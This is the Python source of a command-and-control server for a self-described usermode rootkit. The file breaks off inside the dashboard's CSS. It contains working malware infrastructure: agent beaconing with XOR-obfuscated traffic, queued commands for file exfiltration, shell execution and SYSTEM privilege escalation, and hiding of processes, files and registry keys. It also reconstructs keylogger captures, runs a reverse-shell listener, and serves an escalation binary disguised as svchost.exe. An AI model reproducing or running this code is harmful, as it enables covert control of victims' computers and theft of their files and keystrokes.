#!/usr/bin/env python3

"""
XvX Usermode Rootkit v3.0 - C2 Server
Copyright (c) 2025 - 28zaakypro@proton.me

Flask HTTPS C2 server with web dashboard for agent management.
Features: agent registration, task queuing, result collection, interactive SYSTEM shells.

Supported Commands:
  - exfil|<path>: File exfiltration
  - shell|<cmd>: Execute shell command
  - privesc: SYSTEM privilege escalation
  - revshell_start/stop/input/output: Interactive shell
  - hide_process|<name>: Hide process from Task Manager
  - hide_file|<path>: Hide file/folder from Explorer
  - hide_registry|<key>: Hide registry key from Regedit
  - unhide_process|<name>: Unhide specific process
  - unhide_file|<path>: Unhide specific file
  - unhide_registry|<key>: Unhide specific registry key
  - unhide_all: Unhide all hidden items
  - sleep|<ms>: Change beacon interval
  - die: Terminate rootkit
"""

from flask import Flask, request, jsonify, render_template_string, send_file
import sqlite3
import os
import base64
from datetime import datetime
import ssl
import socket
import threading

app = Flask(__name__)

DB_PATH = "c2.db"
HOST = "0.0.0.0" 
PORT = 8443
SHELL_PORT = 4444

def xor_encrypt(data: str, key: str) -> bytes:
    """Chiffre une chaîne avec XOR (UTF-8) et retourne bytes."""
    key_bytes = key.encode('utf-8')
    data_bytes = data.encode('utf-8')
    result = bytearray()
    for i in range(len(data_bytes)):
        result.append(data_bytes[i] ^ key_bytes[i % len(key_bytes)])
    return bytes(result)

def xor_decrypt(encrypted_bytes: bytes, key: str) -> str:
    """Déchiffre des bytes XOR détecte automatiquement UTF-8 ou UTF-16-LE."""
    null_count = encrypted_bytes.count(0)
    is_utf16 = (null_count > len(encrypted_bytes) * 0.3)
    
    if is_utf16:
        encrypted_wchars = []
        for i in range(0, len(encrypted_bytes), 2):
            if i + 1 < len(encrypted_bytes):
                wchar_code = encrypted_bytes[i] | (encrypted_bytes[i+1] << 8)
                encrypted_wchars.append(wchar_code)
        
        result = []
        key_len = len(key)
        for i, enc_code in enumerate(encrypted_wchars):
            key_code = ord(key[i % key_len])
            decrypted_code = enc_code ^ key_code
            result.append(chr(decrypted_code))
        
        return ''.join(result)
    else:
        key_bytes = key.encode('utf-8')
        result = bytearray()
        for i in range(len(encrypted_bytes)):
            result.append(encrypted_bytes[i] ^ key_bytes[i % len(key_bytes)])
        return result.decode('utf-8', errors='ignore')

def base64_decode_wstring(data: bytes) -> bytes:
    """Décode Base64 depuis format UTF-8 (envoyé par le client C++)."""
    try:
        b64_string = data.decode('utf-8', errors='ignore')
        return base64.b64decode(b64_string)
    except Exception as e:
        print(f"[ERROR] base64_decode_wstring failed: {e}")
        return base64.b64decode(data)

def clean_keylog(raw_keylog: str) -> str:
    """
    Interprète les touches brutes pour reconstruire le texte réel.
    Gère: [BACKSPACE], [CAPSLOCK], [LEFT], [RIGHT], [DELETE], etc.
    """
    result = []
    cursor_pos = 0
    caps_lock_on = False
    
    i = 0
    while i < len(raw_keylog):
        # Détecter les touches spéciales entre crochets
        if raw_keylog[i] == '[':
            end_bracket = raw_keylog.find(']', i)
            if end_bracket != -1:
                key = raw_keylog[i:end_bracket+1]
                
                if key == '[BACKSPACE]':
                    # Supprimer le caractère avant le curseur
                    if cursor_pos > 0:
                        result.pop(cursor_pos - 1)
                        cursor_pos -= 1
                
                elif key == '[DELETE]':
                    # Supprimer le caractère après le curseur
                    if cursor_pos < len(result):
                        result.pop(cursor_pos)
                
                elif key == '[CAPSLOCK]':
                    caps_lock_on = not caps_lock_on
                
                elif key == '[LEFT]':
                    # Déplacer curseur vers la gauche
                    if cursor_pos > 0:
                        cursor_pos -= 1
                
                elif key == '[RIGHT]':
                    # Déplacer curseur vers la droite
                    if cursor_pos < len(result):
                        cursor_pos += 1
                
                elif key == '[ENTER]':
                    # Nouvelle ligne
                    result.insert(cursor_pos, '\n')
                    cursor_pos += 1
                
                elif key == '[TAB]':
                    # Tabulation
                    result.insert(cursor_pos, '\t')
                    cursor_pos += 1
                
                elif key in ['[SHIFT]', '[CTRL]', '[ALT]', '[WIN]']:
                    pass
                
                else:
                    result.insert(cursor_pos, key)
                    cursor_pos += 1
                
                i = end_bracket + 1
                continue
        
        char = raw_keylog[i]
        
        # Appliquer Caps Lock si activé (pour lettres minuscules)
        if caps_lock_on and char.isalpha():
            char = char.upper() if char.islower() else char.lower()
        
        result.insert(cursor_pos, char)
        cursor_pos += 1
        i += 1
    
    return ''.join(result)

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS agents (
            agent_id TEXT PRIMARY KEY,
            hostname TEXT,
            username TEXT,
            os_version TEXT,
            ip_address TEXT,
            first_seen TEXT,
            last_seen TEXT
        )
    """)
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            command TEXT,
            status TEXT DEFAULT 'pending',
            created_at TEXT,
            FOREIGN KEY (agent_id) REFERENCES agents(agent_id)
        )
    """)
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            command TEXT,
            status TEXT,
            output TEXT,
            received_at TEXT,
            FOREIGN KEY (agent_id) REFERENCES agents(agent_id)
        )
    """)
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS keylogs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            window_title TEXT,
            keystrokes TEXT,
            cleaned_text TEXT,
            timestamp TEXT,
            FOREIGN KEY (agent_id) REFERENCES agents(agent_id)
        )
    """)
    
    conn.commit()
    conn.close()


# ENDPOINT: Beacon Agent
@app.route('/api/checkin', methods=['POST'])
def checkin():
    """
    Reçoit le beacon d'un agent et retourne les commandes en attente.
    
    Format requête (XOR + Base64):
        agent_id|hostname|username|os_version
    
    Format réponse (XOR + Base64):
        CMD1|ARG1|ARG2\nCMD2|ARG1\n...
    """
    try:
        raw_data = request.data
        print(f"\n[CHECKIN] ========== NEW REQUEST ==========")
        print(f"[CHECKIN] Received {len(raw_data)} bytes from {request.remote_addr}")
        
        # Lire header X-Key-Hint si présent
        key_hint = request.headers.get('X-Key-Hint', '')
        if key_hint:
            print(f"[CHECKIN] Key hint from header: {key_hint}")
        
        print(f"[CHECKIN] Full hex dump:")
        for i in range(0, min(len(raw_data), 200), 32):
            hex_part = raw_data[i:i+32].hex(' ')
            ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in raw_data[i:i+32])
            print(f"  {i:04x}: {hex_part:48s}  {ascii_part}")
        
        # Décoder Base64
        try:
            encrypted_bytes = base64_decode_wstring(raw_data)
            print(f"[CHECKIN] Base64 decoded: {len(encrypted_bytes)} bytes")
            print(f"[CHECKIN] Encrypted hex: {encrypted_bytes.hex()[:100]}")
        except Exception as e:
            print(f"[ERROR] Base64 decode failed: {e}")
            return '', 400
        
        # Essayer de déchiffrer avec plusieurs clés pssible 
        # Format attendu: agent_id|hostname|username|os_version
        decrypted = None
        
        # Si header présent, utiliser directement
        if key_hint:
            test_key = key_hint + "SecretKey2025"
            try:
                decrypted = xor_decrypt(encrypted_bytes, test_key)
                if '|' in decrypted and len(decrypted.split('|')) >= 4:
                    print(f"[CHECKIN] ✓ Decrypted with key from hint!")
                else:
                    print(f"[ERROR] Key hint didn't work, trying bruteforce...")
                    decrypted = None
            except Exception as e:
                print(f"[ERROR] Key hint failed: {e}")
                decrypted = None
        
        # Bruteforce si pas de hint ou si hint a échoué
        if not decrypted:
            print(f"[CHECKIN] Starting bruteforce...")
            for test_hostname in ["ZAAKY", "SANDBOX2", "ZAKAKY", "DESKTOP-", "LAPTOP-", "WIN-", "PC-", "WINDOWS-"]:
                for test_user in ["zak28", "0x42", "user", "admin", "Administrator", "User"]:
                    test_key = f"{test_hostname}{test_user}SecretKey2025"
                    try:
                        test_decrypt = xor_decrypt(encrypted_bytes, test_key)
                        if '|' in test_decrypt and len(test_decrypt.split('|')) >= 4:
                            parts = test_decrypt.split('|')
                            # Vérifier que l'agent_id est en hex ASCII
                            if all(c in '0123456789abcdefABCDEF_' for c in parts[0]):
                                decrypted = test_decrypt
                                print(f"[CHECKIN] ✓ Decrypted with key: {test_key}")
                                break
                    except Exception as e:
                        continue
                
                if decrypted:
                    break
        
        if not decrypted:
            print(f"[ERROR] Bruteforce failed. Unable to decrypt.")
        
        if not decrypted:
            # Essayer de déchiffrer en essayant différentes longueurs
            print(f"[ERROR] Could not decrypt data. Trying raw decode...")
            return '', 400
        
        print(f"[CHECKIN] Decrypted data: {decrypted[:200]}")
        
        # Parser: agent_id|hostname|username|os_version
        data = decrypted
        parts = data.split('|')
        if len(parts) < 4:
            return '', 400
        
        agent_id, hostname, username, os_version = parts[0], parts[1], parts[2], parts[3]
        
        # Reconstruire la clé XOR (ComputerName + Username + "SecretKey2025")
        agent_key = hostname + username + "SecretKey2025"
        print(f"[AGENT] {agent_id} - {hostname}\\{username} ({os_version})")
        
        # Enregistrer/mettre à jour agent
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute("SELECT agent_id FROM agents WHERE agent_id = ?", (agent_id,))
        exists = cursor.fetchone()
        
        now = datetime.now().isoformat()
        
        # Recup l'IP du client
        client_ip = request.remote_addr
        
        if exists:
            cursor.execute("""
                UPDATE agents 
                SET last_seen = ?, hostname = ?, username = ?, os_version = ?, ip_address = ?
                WHERE agent_id = ?
            """, (now, hostname, username, os_version, client_ip, agent_id))
        else:
            cursor.execute("""
                INSERT INTO agents (agent_id, hostname, username, os_version, ip_address, first_seen, last_seen)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            """, (agent_id, hostname, username, os_version, client_ip, now, now))
        
        # Récupérer commandes en attente
        cursor.execute("""
            SELECT id, command FROM tasks 
            WHERE agent_id = ? AND status = 'pending'
            ORDER BY created_at ASC
        """, (agent_id,))
        
        tasks = cursor.fetchall()
        print(f"[TASKS] Found {len(tasks)} pending tasks for agent {agent_id}")
        
        # Marquer comme "sent"
        for task_id, cmd in tasks:
            cursor.execute("UPDATE tasks SET status = 'sent' WHERE id = ?", (task_id,))
            print(f"[TASKS] -> Task {task_id}: {cmd[:60]}")
        
        conn.commit()
        conn.close()
        
        # Construire réponse
        response = '\n'.join([task[1] for task in tasks])
        print(f"[RESPONSE] Sending {len(response)} chars: {response[:100]}")
        
        # Chiffrer réponse (XOR + Base64) avec la clé de l'agent
        if response:
            encrypted = xor_encrypt(response, agent_key)
            b64_response = base64.b64encode(encrypted).decode('ascii')
            print(f"[RESPONSE] Encrypted {len(b64_response)} base64 chars")
            return b64_response.encode('utf-8'), 200
        else:
            print(f"[RESPONSE] No tasks, sending empty response")
            return ''.encode('utf-8'), 200
        
    except Exception as e:
        print(f"[ERROR] /api/checkin: {e}")
        return '', 500

# ENDPOINT: Résultat d'exécution
@app.route('/api/result', methods=['POST'])
def result():
    """
    Reçoit le résultat d'une commande exécutée par un agent.
    
    Format requête (XOR + Base64):
        agent_id|command_id|status|output
    """
    try:
        raw_data = request.data
        print(f"\n[RESULT] ========== NEW RESULT ==========")
        print(f"[RESULT] Received {len(raw_data)} bytes from {request.remote_addr}")
        print(f"[RESULT] First 100 bytes hex: {raw_data[:100].hex()}")
        
        # Lire hint clé depuis header
        key_hint = request.headers.get('X-Key-Hint', '')
        if key_hint:
            print(f"[RESULT] Key hint: {key_hint}")
        
        try:
            encrypted_base64 = raw_data.decode('utf-8', errors='ignore').strip()
            print(f"[RESULT] Base64 string (first 100 chars): {encrypted_base64[:100]}")
            
            encrypted_bytes = base64.b64decode(encrypted_base64)
            print(f"[RESULT] Base64 decoded: {len(encrypted_bytes)} bytes")
            print(f"[RESULT] Encrypted hex: {encrypted_bytes.hex()[:100]}")
        except Exception as e:
            print(f"[ERROR] Failed to decode: {e}")
            return '', 400
        
        decrypted = None
        if key_hint:
            test_key = key_hint + "SecretKey2025"
            try:
                decrypted = xor_decrypt(encrypted_bytes, test_key)
                if '|' in decrypted and len(decrypted.split('|')) >= 3:
                    print(f"[RESULT] ✓ Decrypted with key from hint!")
                else:
                    decrypted = None
            except Exception as e:
                print(f"[ERROR] Key hint failed: {e}")
        
        if not decrypted:
            print(f"[RESULT] Starting bruteforce...")
            for test_hostname in ["ZAAKY", "SANDBOX2", "ZAKAKY"]:
                for test_user in ["zak28", "0x42", "user", "admin"]:
                    test_key = f"{test_hostname}{test_user}SecretKey2025"
                    try:
                        test_decrypt = xor_decrypt(encrypted_bytes, test_key)
                        if '|' in test_decrypt and len(test_decrypt.split('|')) >= 3:
                            decrypted = test_decrypt
                            print(f"[RESULT] ✓ Decrypted with key: {test_key}")
                            break
                    except:
                        continue
                if decrypted:
                    break
        
        if not decrypted:
            print(f"[ERROR] Could not decrypt result")
            return '', 400
        
        print(f"[RESULT] Decrypted: {decrypted[:200]}")
        
        # Parser: agent_id|command_id|status|output
        parts = decrypted.split('|', 3)
        if len(parts) < 4:
            print(f"[ERROR] Invalid format (expected 4 parts, got {len(parts)})")
            return '', 400
        
        agent_id, command_id, status, output = parts[0], parts[1], parts[2], parts[3]
        
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        now = datetime.now().isoformat()
        cursor.execute("""
            INSERT INTO results (agent_id, command, status, output, received_at)
            VALUES (?, ?, ?, ?, ?)
        """, (agent_id, command_id, status, output, now))
        
        conn.commit()
        conn.close()
        
        print(f"[RESULT] Agent {agent_id}: {command_id} → {status}")
        print(f"[RESULT] Output: {output[:100]}")
        if output.startswith("EXFIL|"):
            print(f"[EXFIL] Données reçues: {len(output)} bytes")
        
        return 'OK', 200
        
    except Exception as e:
        print(f"[ERROR] /api/result exception: {e}")
        import traceback
        traceback.print_exc()
        return '', 500

# ENDPOINT: Ping (test connexion)
@app.route('/api/ping', methods=['POST'])
def ping():
    """Test de connexion pour vérifier disponibilité du C2."""
    return 'PONG', 200

# INTERFACE WEB: Liste des agents
@app.route('/api/agents', methods=['GET'])
def list_agents():
    """Retourner la liste des agents enregistrés."""
    try:
        print(f"\n[API] /api/agents called from {request.remote_addr}")
        print(f"[API] Database path: {DB_PATH}")
        print(f"[API] DB file exists: {os.path.exists(DB_PATH)}")
        
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute("SELECT * FROM agents ORDER BY last_seen DESC")
        agents = cursor.fetchall()
        
        print(f"[API] Found {len(agents)} agents in database")
        for agent in agents:
            print(f"[API]   -> {agent[0][:12]} | {agent[1]} | {agent[2]} | {agent[4]} | {agent[6]}")
        
        conn.close()
        
        result = [{
            'agent_id': a[0],
            'hostname': a[1],
            'username': a[2],
            'os_version': a[3],
            'ip_address': a[4],
            'first_seen': a[5],
            'last_seen': a[6]
        } for a in agents]
        
        print(f"[API] Returning {len(result)} agents as JSON")
        return jsonify(result)
    except Exception as e:
        print(f"[ERROR] /api/agents failed: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'error': str(e)}), 500

# INTERFACE WEB: Envoyer commande
@app.route('/api/command', methods=['POST'])
def send_command():
    """
    Ajouter une commande à exécuter pour un agent.
    
    JSON Body:
        {
            "agent_id": "abc123",
            "command": "hide_process|malwaredemerde.exe"
        }
    """
    data = request.json
    agent_id = data.get('agent_id')
    command = data.get('command')
    
    if not agent_id or not command:
        return jsonify({'error': 'Missing agent_id or command'}), 400
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    now = datetime.now().isoformat()
    cursor.execute("""
        INSERT INTO tasks (agent_id, command, status, created_at)
        VALUES (?, ?, 'pending', ?)
    """, (agent_id, command, now))
    
    conn.commit()
    conn.close()
    
    print(f"[COMMAND] {agent_id}: {command}")
    return jsonify({'status': 'queued'}), 200


# PRIVILEGE ESCALATION: Télécharger PrivEsc.exe
@app.route('/download/privesc', methods=['GET'])
def download_privesc():
    """Servir le binaire PrivEsc.exe pour téléchargement."""
    privesc_path = os.path.join(os.path.dirname(__file__), "PrivEscalation", "PrivEsc_C2.exe")
    
    if not os.path.exists(privesc_path):
        return jsonify({'error': 'PrivEsc.exe not found'}), 404
    
    print(f"[DOWNLOAD] PrivEsc.exe requested")
    return send_file(privesc_path, as_attachment=True, download_name="svchost.exe")


# PRIVILEGE ESCALATION: Listener pour reverse shell SYSTEM
active_shells = {}  # {agent_id: {'socket': socket, 'thread': thread}}

def handle_reverse_shell(client_socket, agent_id):
    """Gérer le reverse shell SYSTEM."""
    print(f"[PRIVESC] SYSTEM shell connected from {agent_id}")
    
    try:
        client_socket.settimeout(10)
        
        while True:
            # Lire la commande depuis la DB
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT id, command FROM tasks 
                WHERE agent_id = ? AND status = 'pending' AND command LIKE 'shell|system %'
                LIMIT 1
            """, (agent_id,))
            
            task = cursor.fetchone()
            
            if task:
                task_id, command = task
                shell_cmd = command.split('|', 1)[1] + '\n'
                
                print(f"[PRIVESC] Sending command to {agent_id}: {shell_cmd.strip()}")
                
                # Envoyer au shell SYSTEM en UTF-16-LE
                client_socket.sendall(shell_cmd.encode('utf-16-le'))
                
                # Recevoir sortie avec timeout
                output = b""
                try:
                    start_time = time.time()
                    while time.time() - start_time < 10:
                        try:
                            chunk = client_socket.recv(4096)
                            if not chunk:
                                print(f"[PRIVESC] Connection closed by agent")
                                break
                            output += chunk
                            # Courte pause pour voir si d'autres données arrivent
                            client_socket.settimeout(0.5)
                        except socket.timeout:
                            if output:
                                print(f"[PRIVESC] No more data, output complete ({len(output)} bytes)")
                                break
                            client_socket.settimeout(10)
                    
                    try:
                        result = output.decode('utf-16-le', errors='ignore').strip('\x00').strip()
                    except:
                        result = output.decode('utf-8', errors='ignore').strip()
                    
                    print(f"[PRIVESC] Received output: {result[:200]}")
                    
                except socket.timeout:
                    result = "[TIMEOUT] No response received"
                    print(f"[PRIVESC] Timeout waiting for response")
                
                # Stocker le résultat
                cursor.execute("""
                    INSERT INTO results (agent_id, command, status, output, received_at)
                    VALUES (?, ?, 'success', ?, ?)
                """, (agent_id, command, result or "[No output]", datetime.now().isoformat()))
                
                cursor.execute("UPDATE tasks SET status = 'completed' WHERE id = ?", (task_id,))
                
                conn.commit()
                print(f"[PRIVESC] Command completed, result stored")
            
            conn.close()
            
            import time
            time.sleep(1)
            
    except Exception as e:
        print(f"[PRIVESC ERROR] {agent_id}: {e}")
        import traceback
        traceback.print_exc()
    finally:
        try:
            client_socket.close()
        except:
            pass
        if agent_id in active_shells:
            del active_shells[agent_id]
        print(f"[PRIVESC] Shell handler closed for {agent_id}")

def start_shell_listener():
    """Démarrer le listener TCP pour les reverse shells."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('0.0.0.0', SHELL_PORT))
    server_socket.listen(5)
    
    print(f"[PRIVESC] Shell listener started on port {SHELL_PORT}")
    
    while True:
        try:
            client_socket, address = server_socket.accept()
            print(f"[PRIVESC] New connection from {address}")
            
            # Identify agent (first message should be agent_id in UTF-16-LE)
            try:
                raw_agent_id = client_socket.recv(2048)
                print(f"[PRIVESC] Received {len(raw_agent_id)} bytes: {raw_agent_id[:100].hex()}")
                
                try:
                    agent_id = raw_agent_id.decode('utf-16-le', errors='ignore').strip('\x00').strip()
                    print(f"[PRIVESC] Agent ID (UTF-16-LE): {agent_id}")
                except:
                    # Fallback UTF-8
                    agent_id = raw_agent_id.decode('utf-8', errors='ignore').strip('\x00').strip()
                    print(f"[PRIVESC] Agent ID (UTF-8): {agent_id}")
                
                if agent_id and len(agent_id) > 5:
                    print(f"[PRIVESC] ✓ Valid agent ID: {agent_id}")
                    active_shells[agent_id] = {'socket': client_socket}
                    thread = threading.Thread(target=handle_reverse_shell, args=(client_socket, agent_id))
                    thread.daemon = True
                    thread.start()
                    active_shells[agent_id]['thread'] = thread
                else:
                    print(f"[PRIVESC] ✗ Invalid agent ID, closing connection")
                    client_socket.close()
                    
            except Exception as e:
                print(f"[PRIVESC] Error reading agent ID: {e}")
                import traceback
                traceback.print_exc()
                client_socket.close()
                
        except Exception as e:
            print(f"[PRIVESC LISTENER ERROR] {e}")
            import traceback
            traceback.print_exc()


# INTERFACE WEB: Liste des résultats
@app.route('/api/results', methods=['GET'])
def list_results():
    """Retourner la liste des résultats d'exécution."""
    try:
        print(f"\n[API] /api/results called from {request.remote_addr}")
        
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute("SELECT * FROM results ORDER BY received_at DESC LIMIT 50")
        results = cursor.fetchall()
        
        print(f"[API] Found {len(results)} results in database")
        
        conn.close()
        
        result = [{
            'id': r[0],
            'agent_id': r[1],
            'command': r[2],
            'status': r[3],
            'output': r[4],
            'received_at': r[5]
        } for r in results]
        
        print(f"[API] Returning {len(result)} results as JSON")
        return jsonify(result)
    except Exception as e:
        print(f"[ERROR] /api/results failed: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'error': str(e)}), 500

@app.route('/api/keylogs', methods=['GET'])
def list_keylogs():
    """Retourner uniquement les keylogs avec formatage."""
    try:
        agent_filter = request.args.get('agent_id', '')
        print(f"\n[API] /api/keylogs called from {request.remote_addr} (filter: {agent_filter or 'all'})")
        
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        if agent_filter:
            cursor.execute("""
                SELECT r.*, a.hostname, a.ip_address 
                FROM results r 
                JOIN agents a ON r.agent_id = a.agent_id 
                WHERE r.command LIKE 'keylog_%' AND r.agent_id = ?
                ORDER BY r.received_at DESC 
                LIMIT 100
            """, (agent_filter,))
        else:
            cursor.execute("""
                SELECT r.*, a.hostname, a.ip_address 
                FROM results r 
                JOIN agents a ON r.agent_id = a.agent_id 
                WHERE r.command LIKE 'keylog_%' 
                ORDER BY r.received_at DESC 
                LIMIT 100
            """)
        
        keylogs = cursor.fetchall()
        print(f"[API] Found {len(keylogs)} keylogs")
        
        conn.close()
        
        result = []
        for k in keylogs:
            raw_output = k[4]
            cleaned = clean_keylog(raw_output) if raw_output else ""
            
            result.append({
                'id': k[0],
                'agent_id': k[1],
                'command': k[2],
                'status': k[3],
                'output': raw_output,
                'cleaned_text': cleaned,
                'received_at': k[5],
                'hostname': k[6],
                'ip_address': k[7]
            })
        
        return jsonify(result)
    except Exception as e:
        print(f"[ERROR] /api/keylogs failed: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'error': str(e)}), 500

#===============================================================#
#                INTERFACE WEB : DASHBOARD                      #
#===============================================================#

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate, max-age=0">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>XVX C2 Framework</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        :root {
            --bg-dark: #0a0a0f;
            --bg-card: #14141f;
            --bg-hover: #1c1c2e;
            --border: #2a2a3e;
            --accent: #00d9ff;
            --accent-glow: rgba(0, 217, 255, 0.2);
            --danger: #ff3860;
            --danger-glow: rgba(255, 56, 96, 0.15);
            --success: #00ff85;
            --success-glow: rgba(0, 255, 133, 0.15);
            --text-primary: #e8eaed;
            --text-secondary: #9aa0a6;
            --text-muted: #5f6368;
        }
        
        body {
            font-family: 'JetBrains Mono', 'Consolas', monospace;
            background: var(--bg-dark);
            color: var(--text-primary);
            min-height: 100vh;
            display: flex;
            overflow: hidden;
        }
        
        /* Sidebar */
        .sidebar {
            width: 260px;
            background: var(--bg-card);
            border-right: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            height: 100vh;
        }
        
        .logo {
            padding: 30px 24px;
            border-bottom: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        
        .logo-text {
            font-size: 1.5em;
            font-weight: 700;
            color: var(--accent);
            letter-spacing: 4px;
            text-shadow: 0 0 20px var(--accent-glow);
        }
        
        .logo-subtitle {
            font-size: 0.7em;
            color: var(--text-muted);
            letter-spacing: 2px;
            font-weight: 500;
        }
        
        .nav-menu {
            flex: 1;
            padding: 20px 0;
        }
        
        .nav-item {
            display: flex;
            align-items: center;
            padding: 14px 24px;
            margin: 4px 12px;
            color: var(--text-secondary);
            text-decoration: none;
            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
            border-radius: 8px;
            gap: 14px;
            position: relative;
            border-left: 2px solid transparent;
        }
        
        .nav-item:hover {
            background: var(--bg-hover);
            color: var(--text-primary);
            transform: translateX(2px);
        }
        
        .nav-item.active {
            background: var(--accent-glow);
            color: var(--accent);
            border-left-color: var(--accent);
            box-shadow: 0 0 20px var(--accent-glow);
        }
        
        .nav-icon {
            font-size: 1.2em;
            width: 20px;
            text-align: center;
        }
        
        .nav-text {
            font-size: 0.85em;
            font-weight: 600;
            letter-spacing: 0.3px;
        }
        
        .nav-badge {
            margin-left: auto;
            background: var(--accent);
            color: var(--bg-dark);
            padding: 3px 9px;
            border-radius: 10px;
            font-size: 0.7em;
            font-weight: 700;
        }
        
        .sidebar-footer {
            padding: 24px;
            border-top: 1px solid var(--border);
            background: linear-gradient(180deg, transparent 0%, rgba(0,217,255,0.02) 100%);
        }
        
        .connection-status {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 0.75em;
            color: var(--text-secondary);
            padding: 10px;
            background: var(--bg-dark);
            border-radius: 6px;
            border: 1px solid var(--border);
        }
        
        .status-dot {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            background: var(--success);
            box-shadow: 0 0 10px var(--success);
            animation: pulse 2.5s infinite;
        }
        
        .creator-credit {
            margin-top: 12px;
            padding: 8px 10px;
            font-size: 0.65em;
            color: var(--text-muted);
            text-align: center;
            border-top: 1px solid rgba(42, 42, 62, 0.3);
            opacity: 0.6;
            transition: opacity 0.3s ease;
        }
        
        .creator-credit:hover {
            opacity: 1;
        }
        
        .creator-credit a {
            color: var(--accent);
            text-decoration: none;
            font-weight: 600;
            letter-spacing: 0.5px;
            transition: all 0.3s ease;
        }
        
        .creator-credit a:hover {
            text-shadow: 0 0 8px var(--accent-glow);
            letter-spacing: 1px;
        }
        
        /* Main Content */
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        
        .top-bar {
            background: var(--bg-card);
            border-bottom: 1px solid var(--border);
            padding: 20px 32px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .view-title {
            font-size: 1.1em;
            font-weight: 600;
            color: var(--text-primary);
            letter-spacing: 2px;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .view-title::before {
            content: '';
            width: 3px;
            height: 24px;
            background: var(--accent);
            box-shadow: 0 0 10px var(--accent);
        }
        
        .stats-compact {
            display: flex;
            gap: 1px;
            background: var(--border);
            border-radius: 8px;
            overflow: hidden;
        }
        
        .stat-compact {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 12px 24px;
            background: var(--bg-dark);
        }
        
        .stat-compact-value {
            font-size: 1.8em;
            font-weight: 700;
            color: var(--accent);
            line-height: 1;
        }
        
        .stat-compact-label {
            font-size: 0.65em;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 1.5px;
            margin-top: 6px;
            font-weight: 600;
        }
        
        /* Content Area */
        .content-wrapper {
            flex: 1;
            overflow-y: auto;
            padding: 25px;
            background: var(--bg-primary);
            position: relative;
        }
        
        /* Custom Scrollbar */
        .content-wrapper::-webkit-scrollbar {
            width: 12px;
        }
        
        .content-wrapper::-webkit-scrollbar-track {
            background: var(--bg-dark);
            border-left: 1px solid var(--border);
        }
        
        .content-wrapper::-webkit-scrollbar-thumb {
            background: var(--accent);
            border-radius: 6px;
            border: 2px solid var(--bg-dark);
        }
        
        .content-wrapper::-webkit-scrollbar-thumb:hover {
            background: var(--accent);
            box-shadow: 0 0 10px var(--accent-glow);
        }
        
        .view-panel {
            display: none;
            animation: fadeIn 0.3s ease;
        }
        
        .view-panel.active {
            display: block;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        /* Shell Panel */
        .shell-panel {
            display: none;
            margin-top: 20px;
            background: var(--bg-dark);
            border: 1px solid var(--accent);
            border-radius: 12px;
            flex-direction: column;
            height: 450px;
            overflow: hidden;
            box-shadow: 0 8px 24px rgba(0,217,255,0.1);
        }
        
        .shell-panel.active {
            display: flex;
            animation: slideDown 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        /* SYSTEM Shell Panel (différent style) */
        .shell-system-panel {
            display: none;
            margin-top: 20px;
            background: var(--bg-dark);
            border: 1px solid var(--danger);
            border-radius: 12px;
            flex-direction: column;
            height: 450px;
            overflow: hidden;
            box-shadow: 0 8px 24px var(--danger-glow);
        }
        
        .shell-system-panel.active {
            display: flex;
            animation: slideDown 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        .shell-system-header {
            padding: 16px 24px;
            background: linear-gradient(135deg, rgba(255,56,96,0.1) 0%, rgba(255,56,96,0.05) 100%);
            border-bottom: 1px solid var(--danger);
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .shell-system-badge {
            background: var(--danger);
            color: var(--bg-dark);
            padding: 4px 10px;
            font-size: 0.7em;
            font-weight: 700;
            border-radius: 4px;
            margin-left: 10px;
            letter-spacing: 1px;
        }
        
        @keyframes slideDown {
